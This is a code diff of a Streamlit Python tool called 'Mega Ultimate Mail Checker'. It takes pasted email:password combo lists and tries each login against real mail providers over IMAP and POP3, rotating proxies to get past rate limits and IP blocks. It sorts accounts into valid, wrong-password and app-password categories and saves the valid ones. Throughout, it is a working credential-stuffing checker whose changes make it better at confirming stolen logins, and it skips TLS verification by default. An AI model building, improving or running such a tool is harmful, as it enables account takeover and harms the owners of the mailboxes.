@@ -1,9 +1,36 @@
 """
-Mega Ultimate Mail Checker — v13.7
+Mega Ultimate Mail Checker — v13.8
 ==================================
 Complete rewrite. SMTP reachability is an OPT-IN pre-check stage (never inside
 the validator), status classification actually works, and every direct-connection
 line carries the real egress IP / region / country / VPN state.
+
+v13.8 changes  (verdict retention + budget rebalance + 407 breaker)
+-------------------------------------------------------------------
+* CRITICAL FIX — VERDICT RETENTION. check_account_sync now keeps a best_verdict
+  the first time ANY host hands back VALID / WRONG_PASSWORD / NEED_APP_PASSWORD.
+  Previously a definitive auth answer was thrown away the moment the local-part
+  retry timed out: run_plan returned None, the ladder rotated on, and the account
+  was finally reported as CONNECTION_FAILED. That is exactly why rows with a
+  definitive answer landed in CONNECTION_FAILED, and why genuinely-valid accounts
+  that only answer over DIRECT also failed. best_verdict is returned at ladder
+  end, ahead of RETRY / DNS_FAILED / CONNECTION_FAILED, and ahead of the
+  critical-exception fallback too.
+* BUDGET REBALANCE. The proxy pass now gets 55% of the per-account budget (was
+  72%) so the DIRECT pass always keeps ~45% of the wall clock. Rotations per host
+  cut from 4 to 2 — the proxy pool no longer eats the budget before the direct
+  line is ever tried.
+* 407 BREAKER. 407 is treated as proxy-level, and after 3 consecutive 407s on the
+  same host the engine stops burning proxies on it and jumps straight to DIRECT
+  (the imap.sympatico.ca storm).
+* 'Lookup failed' now falls through to the NEXT HOST instead of rotating proxies
+  — it is a host routing miss, not a proxy fault.
+* vpn_state_label() only stamps VPN ON (auto) for explicit VPN brands / the
+  literal "vpn" token. Cloud / hosting ISPs (Google Cloud, Amazon, Hetzner,
+  DigitalOcean, m247, ...) no longer lie about being a VPN.
+* status.py: 'realmless login not allowed' is anchored in _WRONG via
+  _WRONG_STRONG, and the catch-all "error" token was dropped from _WRONG's tail
+  so it stops swallowing connection errors.
 
 v13.7 changes
 -------------
@@ -285,24 +312,34 @@ except Exception as _status_err:
         DNS_FAILED: "#f97316", UNKNOWN: "#94a3b8", SKIPPED_COOLDOWN: "#a78bfa",
     }
 
+    # v13.8: mirrors status.py — no bare "error" token in the WRONG table, and
+    # the Gmail "via your web browser" app-password phrase is present.
     _FB_APP = ("app password", "application-specific", "basic authentication is disabled",
-               "web browser", "2fa", "mfa", "two-factor", "enable imap", "login-disabled")
+               "web browser", "via your web browser", "2fa", "mfa", "two-factor",
+               "enable imap", "login-disabled")
     _FB_DNS = ("does not resolve", "name or service not known", "gaierror", "getaddrinfo")
     _FB_RETRY = ("lookup failed", "could not be routed", "temporarily", "too many",
                  "blacklisted", "rate limit", "throttl", "try again", "unavailable")
     _FB_CONN = ("timed out", "timeout", "connection refused", "connection reset", "socket error",
                 "eof", "tls not supported", "stls not supported", "ssl", "no route to host",
                 "wrong version number", "proxy and direct fallback", "handshake")
-    _FB_WRONG = ("authenticationfailed", "authentication failed", "authenticate error",
-                 "invalid credentials", "invalid login", "invalid password", "invalid user",
-                 "login incorrect", "login failed", "wrong password", "user rejected",
-                 "password rejected", "logon failure", "error")
+    _FB_WRONG_STRONG = ("realmless login not allowed", "authenticationfailed",
+                        "authentication failed", "invalid credentials", "login incorrect",
+                        "wrong password", "authenticate error")
+    _FB_WRONG = ("authenticate failed", "authentication error", "auth failed", "auth failure",
+                 "invalid login", "invalid password", "invalid user", "invalid username",
+                 "login failed", "login failure", "login error", "password incorrect",
+                 "password invalid", "incorrect password", "realmless", "auth error",
+                 "[auth]", "authentication", "not authenticated", "bad credentials",
+                 "bad username", "bad password", "logon failure",
+                 "username and password not accepted", "user rejected", "password rejected",
+                 "invalid token", "expired token", "internal server error")
 
     def st_classify(raw, domain=""):
         t = (raw or "").lower()
-        for table, val in ((_FB_APP, NEED_APP_PASSWORD), (_FB_DNS, DNS_FAILED),
-                           (_FB_RETRY, RETRY_LATER), (_FB_CONN, CONNECTION_FAILED),
-                           (_FB_WRONG, WRONG_PASSWORD)):
+        for table, val in ((_FB_APP, NEED_APP_PASSWORD), (_FB_WRONG_STRONG, WRONG_PASSWORD),
+                           (_FB_DNS, DNS_FAILED), (_FB_RETRY, RETRY_LATER),
+                           (_FB_CONN, CONNECTION_FAILED), (_FB_WRONG, WRONG_PASSWORD)):
             if any(n in t for n in table):
                 return val
         return UNKNOWN
@@ -354,7 +391,6 @@ str_lit.set_page_config(
     initial_sidebar_state="expanded"
 )
 
-
 # ============================================================================
 # THEME ENGINE
 # ============================================================================
@@ -377,7 +413,6 @@ THEME_PRESETS = {
     "Mono":      {"g1": "#3f3f46", "g2": "#71717a", "accent": "#a1a1aa", "accent2": "#d4d4d8", "bg": "#0a0a0b", "panel": "#19191c", "text": "#f4f4f5"},
 }
 
-
 def _lum(hex_color: str) -> float:
     try:
         h = str(hex_color).lstrip("#")
@@ -385,7 +420,6 @@ def _lum(hex_color: str) -> float:
         return (0.299 * r + 0.587 * g + 0.114 * b) / 255.0
     except Exception:
         return 0.0
-
 
 def default_theme() -> dict:
     p = THEME_PRESETS["Aurora"]
@@ -395,10 +429,9 @@ def default_theme() -> dict:
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True,
         "colorize_logs": True,
-        "hero_title": "⚡ Mega Ultimate Mail Checker v13.7",
+        "hero_title": "⚡ Mega Ultimate Mail Checker v13.8",
         "hero_sub": "World-Coverage Edition — router-aware host ranking, rotating proxy pool, geo-call routing, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation.",
     }
-
 
 def load_theme() -> dict:
     base = default_theme()
@@ -412,7 +445,6 @@ def load_theme() -> dict:
             pass
     return base
 
-
 def save_theme(th: dict):
     try:
         with open(THEME_FILE, "w", encoding="utf-8") as f:
@@ -420,10 +452,8 @@ def save_theme(th: dict):
     except Exception:
         pass
 
-
 def is_light(th: dict) -> bool:
     return _lum(th.get("bg", "#000000")) > 0.6
-
 
 def theme_css(th: dict) -> str:
     g1, g2 = th["g1"], th["g2"]
@@ -578,7 +608,6 @@ def theme_css(th: dict) -> str:
 </style>
 """
 
-
 def render_hero(th: dict):
     title = th.get("hero_title", "⚡ Mega Ultimate Mail Checker")
     sub = th.get("hero_sub", "")
@@ -601,7 +630,6 @@ def render_hero(th: dict):
         unsafe_allow_html=True,
     )
 
-
 def section_title(icon: str, title: str, subtitle: str = ""):
     sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
     str_lit.markdown(
@@ -609,7 +637,6 @@ def section_title(icon: str, title: str, subtitle: str = ""):
         f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
         unsafe_allow_html=True,
     )
-
 
 # ---------------------------------------------------------------------------
 # LIVE EXECUTION STREAM COLOUR CONTRACT
@@ -629,7 +656,6 @@ TAG_COLORS = {
     "EXCEPTION": "#fb7185",
     "ERROR": "#fb7185",
 }
-
 
 def _line_color(line: str) -> str:
     up = str(line).upper()
@@ -653,7 +679,6 @@ def _line_color(line: str) -> str:
         return TAG_COLORS["CONNECTION_FAILED"]
     return ""
 
-
 def colorize_logs(lines: List[str]) -> str:
     out = []
     for ln in lines or []:
@@ -662,13 +687,11 @@ def colorize_logs(lines: List[str]) -> str:
         out.append(f'<div class="bb-log" style="{style}">{html.escape(str(ln))}</div>')
     return f'<div class="bb-logbox">{"".join(out)}</div>'
 
-
 def render_logs(lines: List[str], height: int = 300):
     if st.session_state.get("colorize_logs", True):
         str_lit.markdown(colorize_logs(lines), unsafe_allow_html=True)
     else:
         str_lit.code("\n".join(lines), language="text")
-
 
 # --- Initialize theme state BEFORE anything renders ---
 if "theme" not in str_lit.session_state:
@@ -678,7 +701,6 @@ if "colorize_logs" not in str_lit.session_state:
 
 if not os.path.exists(THEME_FILE):
     save_theme(str_lit.session_state.theme)
-
 
 def _sync_theme_from_widgets():
     th = str_lit.session_state.theme
@@ -697,7 +719,6 @@ def _sync_theme_from_widgets():
         th["hero_sub"] = str_lit.session_state["th_hero_sub"]
     save_theme(th)
 
-
 def _on_preset_change():
     name = str_lit.session_state.get("th_preset")
     p = THEME_PRESETS.get(name)
@@ -706,7 +727,6 @@ def _on_preset_change():
             str_lit.session_state[f"th_{k}"] = v
         str_lit.session_state.theme["preset"] = name
         save_theme(str_lit.session_state.theme)
-
 
 def _reset_theme():
     str_lit.session_state.theme = default_theme()
@@ -720,7 +740,6 @@ def _reset_theme():
     str_lit.session_state["th_hero_sub"] = d["hero_sub"]
     str_lit.session_state["colorize_logs"] = d["colorize_logs"]
     save_theme(d)
-
 
 # ============================================================================
 # GLOBAL STATE
@@ -744,16 +763,20 @@ TLD_COUNTRY = {
     "hr": "Croatia", "si": "Slovenia", "rs": "Serbia",
 }
 
-# Tokens that show up in the ISP/org of a hosting provider or VPN.
-_VPN_TOKENS = (
+# v13.8 — EXPLICIT VPN / anonymiser brands only.
+# A hosting or cloud egress (34.127.0.121 = Google Cloud) is NOT a VPN, so
+# "google cloud", "amazon", "m247", "datacamp", "gcore", "hetzner", "ovh",
+# "digitalocean", ... must not stamp VPN ON. Only a real VPN brand, or the
+# literal "vpn" token, does.
+_VPN_BRANDS = (
     "vpn", "nordvpn", "mullvad", "proton", "expressvpn", "surfshark", "cyberghost",
     "private internet", "ipvanish", "windscribe", "tunnelbear", "hide.me", "purevpn",
-    "datacamp", "packethub", "m247", "leaseweb", "psychz", "quickpacket", "frantech",
-    "digitalocean", "linode", "vultr", "hetzner", "ovh", "contabo", "choopa",
-    "amazon", "aws", "google cloud", "microsoft azure", "cloudflare", "oracle cloud",
-    "hostinger", "colocrossing", "hostwinds", "gcore", "scaleway",
+    "astrill", "vyprvpn", "hotspot shield", "ivacy", "torguard", "perfect privacy",
+    "azirevpn", "airvpn", "openvpn", "wireguard",
 )
 
+# Kept for backwards compatibility with anything that still reads the old name.
+_VPN_TOKENS = _VPN_BRANDS
 
 def load_persistent_valid_results():
     valid_list, seen = [], set()
@@ -777,7 +800,6 @@ def load_persistent_valid_results():
     except Exception:
         pass
     return valid_list
-
 
 if "engine_has_run" not in str_lit.session_state:
     str_lit.session_state.engine_has_run = False
@@ -806,10 +828,8 @@ for _k in ("start_timestamp", "end_timestamp", "total_duration"):
     if _k not in str_lit.session_state:
         str_lit.session_state[_k] = None
 
-
 _STARTUP_BUFFER = []
 _STARTUP_BUFFER_LOCK = threading.Lock()
-
 
 def log_startup(msg, quiet: bool = False):
     ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
@@ -827,7 +847,6 @@ def log_startup(msg, quiet: bool = False):
         with _STARTUP_BUFFER_LOCK:
             _STARTUP_BUFFER.append(entry)
 
-
 def startup_panel_lines():
     try:
         main = list(str_lit.session_state.startup_entries)
@@ -838,7 +857,6 @@ def startup_panel_lines():
     if not buffered:
         return main
     return main + ["", "── background thread (quiet mode) ──"] + buffered
-
 
 log_startup("Application process started. Initializing session state and loading configurations...")
 log_startup(f"hosts.py status -> loaded={HOSTS_OK} has_ranking={HOSTS_HAS_RANKING} {HOSTS_IMPORT_NOTE}".strip())
@@ -875,7 +893,6 @@ _SMTP_CACHE_TTL = 900
 _SMTP_PRECHECK_BUDGET = 45.0
 _SMTP_PRECHECK_WORKERS = 32
 
-
 @dataclass
 class CheckerConfig:
     mode_name: str = "Normal"
@@ -886,7 +903,6 @@ class CheckerConfig:
     max_retries: int = 2
     failure_cooldown: float = 30.0
 
-
 def _secret_to_env(k, v):
     if v is None:
         return
@@ -896,7 +912,6 @@ def _secret_to_env(k, v):
     if isinstance(v, dict):
         return
     os.environ[str(k)] = str(v)
-
 
 try:
     for k, v in str_lit.secrets.items():
@@ -911,7 +926,6 @@ log_startup(f"Secrets keys: webshare={len(WEBSHARE_KEYS)} oxylabs={len(OXYLABS_P
 
 if "help_states" not in str_lit.session_state:
     str_lit.session_state.help_states = {}
-
 
 def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
     try:
@@ -952,7 +966,6 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
     except Exception as e:
         warnings.warn(f"Error rendering instant help widget {key_name}: {e}")
     return None
-
 
 # ============================================================================
 # SIDEBAR — ENGINE CONTROL PANEL
@@ -1053,7 +1066,6 @@ if "pool_locked" not in str_lit.session_state:
 if "picked_countries" not in str_lit.session_state:
     str_lit.session_state.picked_countries = []
 
-
 def load_json(path, default=None):
     if default is None:
         default = {}
@@ -1069,10 +1081,8 @@ def load_json(path, default=None):
     log_startup(f"JSON cache file {path} not found. Using default.")
     return default
 
-
 domain_cache = load_json("domain_cache.json", {})
 proxy_meta = load_json("proxy_meta.json", {})
-
 
 def load_proxies(quiet: bool = False):
     """Proxies come from proxies.txt only. Nothing is pre-added."""
@@ -1094,7 +1104,6 @@ def load_proxies(quiet: bool = False):
         log_startup(f"WARNING: Failed to read proxies.txt: {e}", quiet=quiet)
         return []
 
-
 def compute_real_score(success_count, fail_count, initial_latency_score=80):
     try:
         if (success_count + fail_count) == 0:
@@ -1104,14 +1113,12 @@ def compute_real_score(success_count, fail_count, initial_latency_score=80):
     except Exception:
         return initial_latency_score
 
-
 def is_proxy_alive(proxy_host, proxy_port, timeout=2):
     try:
         with socket.create_connection((proxy_host, int(proxy_port)), timeout=timeout):
             return True
     except Exception:
         return False
-
 
 def parse_proxy(proxy_str):
     if not proxy_str:
@@ -1134,7 +1141,6 @@ def parse_proxy(proxy_str):
     except Exception:
         pass
     return None
-
 
 # ---------------------------------------------------------------------------
 # LIVE GEO (no static table — everything comes from ip-api)
@@ -1161,7 +1167,6 @@ def geo_lookup(ip):
         _GEO_CACHE[ip] = (country, region)
     return country, region
 
-
 def public_ip(force=False):
     if not force and _PUBLIC_IP["ip"] and time.time() - _PUBLIC_IP["ts"] < 600:
         return _PUBLIC_IP["ip"]
@@ -1186,7 +1191,6 @@ def public_ip(force=False):
             _PUBLIC_IP.update(ip=ip, ts=time.time())
         return ip or "Unknown"
 
-
 def direct_isp(force=False):
     """ISP / org of the direct egress IP — used for VPN auto-detection."""
     if not force and _DIRECT_ISP["isp"] and time.time() - _DIRECT_ISP["ts"] < 600:
@@ -1205,17 +1209,21 @@ def direct_isp(force=False):
     _DIRECT_ISP.update(isp=isp, ts=time.time())
     return isp
 
-
 def vpn_state_label():
-    """Honour the manual stamp; 'Auto' guesses from the egress ISP."""
+    """Honour the manual stamp; 'Auto' guesses from the egress ISP.
+
+    v13.8: 'Auto' defaults to VPN OFF. Only an explicit VPN brand (or the
+    literal 'vpn' token) in the ISP/org flips it to VPN ON (auto). Cloud and
+    hosting ISPs — Google Cloud, Amazon, Hetzner, DigitalOcean, m247, ... — are
+    no longer mislabelled as a VPN.
+    """
     hint = CFG.get("CONNECTION_HINT", "Auto")
     if hint in ("VPN ON", "VPN OFF"):
         return hint
     isp = (direct_isp() or "").lower()
-    if isp and any(t in isp for t in _VPN_TOKENS):
+    if isp and any(t in isp for t in _VPN_BRANDS):
         return "VPN ON (auto)"
     return "VPN OFF (auto)"
-
 
 def direct_geo(force=False):
     """Real egress IP + its geo + VPN state, for every direct breadcrumb."""
@@ -1229,13 +1237,11 @@ def direct_geo(force=False):
         _DIRECT_GEO.update(ts=time.time(), ip=ip, country=country, region=region, vpn=vpn_state_label())
         return dict(_DIRECT_GEO)
 
-
 def tld_country(domain):
     for part in reversed((domain or "").lower().split(".")):
         if part in TLD_COUNTRY:
             return TLD_COUNTRY[part]
     return None
-
 
 def enrich_proxy_geo(proxies, max_workers=8):
     """Fill proxy_meta country/region for geo-call. Parallel, best-effort."""
@@ -1262,7 +1268,6 @@ def enrich_proxy_geo(proxies, max_workers=8):
         save_proxy_meta()
     except Exception as e:
         log_startup(f"WARNING: proxy geo enrichment error: {e}", quiet=True)
-
 
 def test_single_proxy(proxy_str):
     try:
@@ -1321,7 +1326,6 @@ def test_single_proxy(proxy_str):
     except Exception as e:
         return False, f"Error: {str(e)[:30]}", "Unknown", 0
 
-
 def get_available_countries_with_scores():
     try:
         raw = load_proxies()
@@ -1338,7 +1342,6 @@ def get_available_countries_with_scores():
         return [c for c, _ in ranked if c != "UNKNOWN"] + (["UNKNOWN"] if "UNKNOWN" in country_scores else [])
     except Exception:
         return []
-
 
 if "pool_pick" not in str_lit.session_state:
     str_lit.session_state.pool_pick = None
@@ -1408,7 +1411,6 @@ resolved_proxy_mode = str_lit.sidebar.selectbox(
     help="aggressive: proxy only. fallback: proxy then direct. sticky: one proxy per worker thread. off: never use proxies."
 )
 
-
 def build_cfg():
     return {
         "MODE_NAME": engine_config.mode_name,
@@ -1451,7 +1453,6 @@ def build_cfg():
         "SMTP_CHECK": smtp_precheck_ui,
     }
 
-
 if "applied_cfg" not in str_lit.session_state:
     str_lit.session_state.applied_cfg = build_cfg()
 
@@ -1486,7 +1487,6 @@ log_startup(
     f"self_signed={CFG.get('ALLOW_SELF_SIGNED')} allow_blacklist={CFG.get('ALLOW_BLACKLIST_IPS')} "
     f"random_rotation={CFG.get('RANDOM_ROTATION')} geo_call={CFG.get('GEO_CALL')} smtp_precheck={CFG.get('SMTP_CHECK')}"
 )
-
 
 # ============================================================================
 # SIDEBAR — 🎨 THEME STUDIO
@@ -1562,7 +1562,6 @@ try:
 except Exception as e:
     log_startup(f"WARNING: Failed to create results directory: {e}")
 
-
 def save_domain_cache():
     try:
         with file_write_lock:
@@ -1572,7 +1571,6 @@ def save_domain_cache():
     except Exception as e:
         warnings.warn(f"Failed to save domain cache: {e}")
 
-
 def save_proxy_meta():
     try:
         with file_write_lock:
@@ -1581,7 +1579,6 @@ def save_proxy_meta():
                     json.dump(proxy_meta, f, indent=2)
     except Exception as e:
         warnings.warn(f"Failed to save proxy meta: {e}")
-
 
 def proxy_is_blocked(proxy_str):
     if not proxy_str:
@@ -1594,7 +1591,6 @@ def proxy_is_blocked(proxy_str):
     except Exception:
         pass
     return False
-
 
 def get_filtered_active_proxies(quiet: bool = False):
     try:
@@ -1637,10 +1633,8 @@ def get_filtered_active_proxies(quiet: bool = False):
         log_startup(f"WARNING: Error filtering active proxies: {e}", quiet=quiet)
         return load_proxies(quiet=quiet)
 
-
 all_proxies = load_proxies()
 filtered_pool = get_filtered_active_proxies()
-
 
 # ============================================================================
 # NETWORK CORE  (defined here so the pre-filter stage can use it)
@@ -1652,7 +1646,6 @@ def fast_fail_dns_check(host):
         return True
     except Exception:
         return False
-
 
 def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
     base_timeout = timeout or CFG["PROXY_CONNECT_TIMEOUT"]
@@ -1700,7 +1693,6 @@ def proxy_connect(host, port, proxy_str, timeout=None, remote_dns=True):
 
     raise RuntimeError(f"Proxy connection failed for {host}:{port}: {last_err}")
 
-
 def _tls_context(host: str, verify: bool):
     if verify:
         ctx = ssl.create_default_context()
@@ -1714,7 +1706,6 @@ def _tls_context(host: str, verify: bool):
         pass
     return ctx
 
-
 def _raw_socket(host, port, proxy_str=None, timeout=None):
     t = timeout or CFG["TIMEOUT"]
     if proxy_str and proxy_str != "direct":
@@ -1727,7 +1718,6 @@ def _raw_socket(host, port, proxy_str=None, timeout=None):
     s.settimeout(t)
     return s
 
-
 def tls_connect(host, port, proxy_str=None, insecure=True, timeout=None):
     if insecure or CFG.get("ALLOW_SELF_SIGNED", True):
         return _tls_context(host, False).wrap_socket(_raw_socket(host, port, proxy_str, timeout), server_hostname=host)
@@ -1737,7 +1727,6 @@ def tls_connect(host, port, proxy_str=None, insecure=True, timeout=None):
     except ssl.SSLError as e:
         warnings.warn(f"Verified TLS failed for {host} ({e!r}); retrying unverified on a FRESH socket")
         return _tls_context(host, False).wrap_socket(_raw_socket(host, port, proxy_str, timeout), server_hostname=host)
-
 
 # ---------------------------------------------------------------------------
 # px_tag — EVERY line shows the real egress identity, direct included.
@@ -1752,7 +1741,6 @@ def px_tag(proxy_str):
     meta = proxy_meta.get(proxy_str, {})
     return f"{info.get('host')}:{info.get('port')} | {meta.get('country') or '?'} | {meta.get('region') or '?'}"
 
-
 # ============================================================================
 # PROTOCOL CLIENTS — override _create_socket(), NOT open()
 # ============================================================================
@@ -1766,7 +1754,6 @@ class ProxyIMAP4SSL(imaplib.IMAP4_SSL):
     def _create_socket(self, timeout):
         return tls_connect(self.host, self.port, self._proxy_str, insecure=self._insecure, timeout=timeout)
 
-
 class ProxyIMAP4(imaplib.IMAP4):
     def __init__(self, host, port=143, timeout=None, proxy_str=None):
         self._proxy_str = proxy_str
@@ -1774,7 +1761,6 @@ class ProxyIMAP4(imaplib.IMAP4):
 
     def _create_socket(self, timeout):
         return _raw_socket(self.host, self.port, self._proxy_str, timeout)
-
 
 class ProxyPOP3SSL(poplib.POP3_SSL):
     def __init__(self, host, port=995, timeout=None, proxy_str=None, insecure=True):
@@ -1785,7 +1771,6 @@ class ProxyPOP3SSL(poplib.POP3_SSL):
     def _create_socket(self, timeout):
         return tls_connect(self.host, self.port, self._proxy_str, insecure=self._insecure, timeout=timeout)
 
-
 class ProxyPOP3(poplib.POP3):
     def __init__(self, host, port=110, timeout=None, proxy_str=None):
         self._proxy_str = proxy_str
@@ -1793,7 +1778,6 @@ class ProxyPOP3(poplib.POP3):
 
     def _create_socket(self, timeout):
         return _raw_socket(self.host, self.port, self._proxy_str, timeout)
-
 
 def pop3_ok(resp):
     if resp is None:
@@ -1805,7 +1789,6 @@ def pop3_ok(resp):
     if isinstance(resp, (tuple, list)):
         return len(resp) >= 1
     return True
-
 
 # ============================================================================
 # ERROR CLASSIFICATION
@@ -1820,14 +1803,12 @@ def classify_error(err, domain=""):
     except Exception:
         return UNKNOWN
 
-
 def _is_proxy_level_error(msg):
     try:
         return st_proxy_level(msg)
     except Exception:
         s = (msg or "").lower()
         return any(k in s for k in ("407", "proxy auth", "proxy connect", "socks"))
-
 
 def record_proxy_attempt(proxy_str, success, is_network_error=False):
     try:
@@ -1851,7 +1832,6 @@ def record_proxy_attempt(proxy_str, success, is_network_error=False):
             m["score"] = compute_real_score(m.get("success", 0), m.get("fails", 0))
     except Exception as e:
         warnings.warn(f"Error recording proxy attempt: {e}")
-
 
 # ============================================================================
 # SMTP PRE-CHECK  (OPT-IN — runs BEFORE the validator, never inside it)
@@ -1880,7 +1860,6 @@ def _smtp_banner_ok(hosts, px, timeout=3.5):
                         pass
     return False
 
-
 def smtp_domain_probe(domain, timeout=3.5):
     """Per-domain SMTP reachability. True = alive, False = dead, None = no candidate.
 
@@ -1908,12 +1887,10 @@ def smtp_domain_probe(domain, timeout=3.5):
             return True
     return False
 
-
 def smtp_cached(domain):
     with _SMTP_LOCK:
         hit = _SMTP_DOMAIN_CACHE.get(domain)
     return bool(hit and (time.time() - hit[0]) < _SMTP_CACHE_TTL)
-
 
 def smtp_precheck_domains(domains, max_workers=None, budget=None):
     """Parallel, cached, and wall-clock bounded. Returns {domain: True|False|None}.
@@ -1963,7 +1940,6 @@ def smtp_precheck_domains(domains, max_workers=None, budget=None):
         results.setdefault(d, None)
     return results
 
-
 def smtp_failed_check(domain, px, trace_logs):
     """Legacy helper kept for ad-hoc use. Returns True / False / None. Never raises."""
     try:
@@ -2005,7 +1981,6 @@ def smtp_failed_check(domain, px, trace_logs):
     trace_logs.append("SMTP failed check -> no reachable SMTP candidate")
     return None
 
-
 # ============================================================================
 # PROXY HEALTH / POOL SAMPLING
 # ============================================================================
@@ -2037,11 +2012,9 @@ def sample_alive_proxy(exclude=None, domain=None):
         _rr_index = (_rr_index + 1) % len(pool)
         return pool[_rr_index]
 
-
 _tunnel_cache = {}
 _tunnel_lock = threading.Lock()
 _TUNNEL_TTL = 120
-
 
 def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=3.0):
     try:
@@ -2073,7 +2046,6 @@ def proxy_tunnel_ok(proxy_str, target=("imap.gmail.com", 993), timeout=3.0):
     except Exception:
         return False
 
-
 def precheck_proxy_fast(proxy_str):
     try:
         if not proxy_str:
@@ -2102,7 +2074,6 @@ def precheck_proxy_fast(proxy_str):
         return ok
     except Exception:
         return False
-
 
 def refresh_alive_pool():
     """Parallel — the old one-proxy-at-a-time loop was the whole start lag."""
@@ -2137,7 +2108,6 @@ def refresh_alive_pool():
         alive_pool[:] = live
     enrich_proxy_geo(live)
 
-
 def start_alive_refresher():
     if any(t.name == "alive-pool" for t in threading.enumerate()):
         return
@@ -2152,9 +2122,7 @@ def start_alive_refresher():
 
     threading.Thread(target=loop, daemon=True, name="alive-pool").start()
 
-
 start_alive_refresher()
-
 
 # ============================================================================
 # STARTUP PANEL
@@ -2295,7 +2263,6 @@ with str_lit.sidebar:
         else:
             str_lit.info("No proxy metadata recorded yet.")
 
-
 # ============================================================================
 # PRE-FILTER ENGINE
 # ============================================================================
@@ -2321,7 +2288,6 @@ EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
 DISPOSABLE_EXTRA = {"rerttymail.com", "tmpmail.org", "tmpmail.net", "tempmailo.com"}
 DISPOSABLE_FILE = "disposable_domains.txt"
 
-
 def load_disposable_set():
     found = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
     if os.path.exists(DISPOSABLE_FILE):
@@ -2344,9 +2310,7 @@ def load_disposable_set():
             log_startup(f"Disposable list fetch skipped: {e}")
     return found
 
-
 DISPOSABLE_LIVE = load_disposable_set()
-
 
 def is_disposable(email):
     try:
@@ -2356,7 +2320,6 @@ def is_disposable(email):
         return any(p in domain for p in ("tempmail", "rerttymail", "mailinator", "yopmail", "guerrilla", "throwaway", "10minute"))
     except Exception:
         return False
-
 
 def list_unfinished_runs():
     runs = []
@@ -2374,7 +2337,6 @@ def list_unfinished_runs():
         pass
     return runs
 
-
 def save_unfinished(reason, remaining, checked, total):
     os.makedirs("mail_results", exist_ok=True)
     path = "mail_results/unfinished_live.json"
@@ -2383,12 +2345,10 @@ def save_unfinished(reason, remaining, checked, total):
                    "remaining": remaining, "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, f)
     return path
 
-
 def clear_unfinished():
     path = "mail_results/unfinished_live.json"
     if os.path.exists(path):
         os.remove(path)
-
 
 def check_domain_resolvable(domain, persist=True):
     with cache_lock:
@@ -2417,7 +2377,6 @@ def check_domain_resolvable(domain, persist=True):
         save_domain_cache()
     return resolvable
 
-
 def load_previous_valid():
     seen = set()
     try:
@@ -2441,7 +2400,6 @@ def load_previous_valid():
         log_startup(f"WARNING: Error loading previous valid accounts: {e}")
     return seen
 
-
 def _domains_in_text(text):
     out = []
     for line in (text or "").splitlines():
@@ -2454,7 +2412,6 @@ def _domains_in_text(text):
             if d and d not in out:
                 out.append(d)
     return out
-
 
 def process_accounts(text, previous_valid):
     """Pre-filter pipeline.
@@ -2530,7 +2487,6 @@ def process_accounts(text, previous_valid):
         f"(Filtered DNS failures: {len(dns_fail_list)}, SMTP failures: {len(smtp_fail_list)})"
     )
     return clean, disp_list, typo_list, resume_list, app_skip_list, custom_list, dns_fail_list, smtp_fail_list
-
 
 # --- Main Input Section ---
 section_title("📥", "Accounts Input & Pre-Filtering", "paste combos or upload a file — junk is filtered before the engine runs")
@@ -2644,7 +2600,6 @@ if raw_text:
     else:
         str_lit.info(f"No items in **{filter_category_choice}**.")
 
-
 # ============================================================================
 # PROVIDER TABLES / HOST RESOLUTION
 # ============================================================================
@@ -2662,7 +2617,6 @@ PROVIDER_MAP = {
 PUBLIC_PROVIDERS = set(PROVIDER_MAP.keys())
 PARENT_PROVIDER_MAPPINGS = PARENT
 
-
 def get_mx_hosts(domain):
     if not dns:
         return []
@@ -2670,7 +2624,6 @@ def get_mx_hosts(domain):
         return [str(r.exchange).lower().rstrip(".") for r in sorted(dns.resolver.resolve(domain, "MX"), key=lambda x: x.preference)]
     except Exception:
         return []
-
 
 def detect_parent_provider(domain):
     if domain in PARENT_PROVIDER_MAPPINGS:
@@ -2687,7 +2640,6 @@ def detect_parent_provider(domain):
             return "yahoo.com"
     return None
 
-
 def _location_tokens_from_mx(mx_records, domain):
     toks = []
     for mx in (mx_records or [])[:3]:
@@ -2699,7 +2651,6 @@ def _location_tokens_from_mx(mx_records, domain):
                 continue
             toks.append(p)
     return toks[:1]
-
 
 def _expand_cnames(hosts, limit=6):
     if not dns:
@@ -2718,7 +2669,6 @@ def _expand_cnames(hosts, limit=6):
         except Exception:
             pass
     return out
-
 
 def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
     candidates = []
@@ -2750,10 +2700,8 @@ def generate_candidate_hosts(domain: str, mx_records: list = None) -> list:
 
     return _expand_cnames(list(dict.fromkeys(candidates)))
 
-
 def known_provider_conf(domain):
     return host_conf(domain)
-
 
 def drop_before_check(email):
     email = (email or "").strip().lower()
@@ -2765,7 +2713,6 @@ def drop_before_check(email):
     if any(p in domain for p in ("tempmail", "guerrillamail", "mailinator", "yopmail", "trashmail", "rerttymail", "10minutemail", "throwaway")):
         return "disposable"
     return ""
-
 
 def host_resolves(host):
     if not host:
@@ -2795,14 +2742,11 @@ def host_resolves(host):
         _host_dns_cache[host] = ok
     return ok
 
-
 def _is_junk_host(host, domain):
     return host_is_junk(host, domain)
 
-
 def _rank_hosts(hosts, domain):
     return host_rank_hosts(hosts, domain)
-
 
 def get_servers(email):
     try:
@@ -2856,7 +2800,6 @@ def get_servers(email):
         fp = generate_candidate_hosts(d, [])
         return {"imap": fp, "pop": fp, "pop3": fp}
 
-
 # ============================================================================
 # ATTEMPT HELPERS
 # ============================================================================
@@ -2871,7 +2814,6 @@ def username_candidates(email):
         if local and local.lower() != email.lower():
             out.append(local)
     return list(dict.fromkeys(out))
-
 
 def imap_once(email, password, server, proxy_str=None, insecure=True, port=993, attempt_timeout=None):
     to = attempt_timeout or CFG["TIMEOUT"]
@@ -2894,7 +2836,6 @@ def imap_once(email, password, server, proxy_str=None, insecure=True, port=993, 
                 mail.logout()
             except Exception:
                 pass
-
 
